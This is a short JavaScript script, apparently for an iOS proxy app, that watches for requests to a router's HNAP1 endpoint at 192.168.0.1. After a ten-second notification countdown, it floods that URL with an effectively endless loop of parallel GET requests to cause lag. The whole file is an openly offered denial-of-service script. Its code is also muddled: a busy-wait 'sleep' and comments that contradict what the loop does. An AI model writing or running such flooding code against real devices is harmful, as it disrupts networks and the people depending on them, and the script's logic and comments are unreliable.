// Define the URL pattern to listen for
const urlPattern = /^http:\/\/192\.168\.0\.1\/HNAP1\/$/;

// Function to handle the HTTP request and induce intense lag
function onRequest(request) {
    // Check if the request URL matches the specified pattern
    if (urlPattern.test(request.url)) {
        // Show a notification on iOS that countdown is starting
        $notification.post("URL Matched", "Starting 10-second countdown", request.url);

        // Function to handle the countdown
        function startCountdown(seconds) {
            // Update notification every second
            const countdownInterval = setInterval(() => {
                if (seconds > 0) {
                    $notification.post("URL Matched", `Lagging in ${seconds} seconds...`, request.url);
                    seconds--;
                } else {
                    clearInterval(countdownInterval); // Stop the countdown

                    // Show final notification that lag generation is starting
                    $notification.post("URL Matched - Intense Lagging", "Generating extreme traffic to induce lag", request.url);

                    // Start generating the lag
                    for (let i = 0; i < 1000000000000000000000000; i++) {  // Increase the number of requests significantly
                        // Asynchronously send requests in parallel
                        $httpClient.get(request.url, function(error, response, data) {
                            // Intentionally doing nothing with the response, just generating traffic
                        });
                    }

                    // Sleep for 1 minute between each batch to prevent network overload
                    sleep(60000);  // 60000ms = 1 minute
                }
            }, 1000);  // 1000ms = 1 second
        }

        // Start the countdown from 10 seconds
        startCountdown(10);
    }
}

// Simulate sleep/delay function (optional)
function sleep(ms) {
    const start = Date.now();
    while (Date.now() - start < ms) {
        // Busy wait
    }
}

// Attach the function to handle the HTTP request event
onRequest($request);
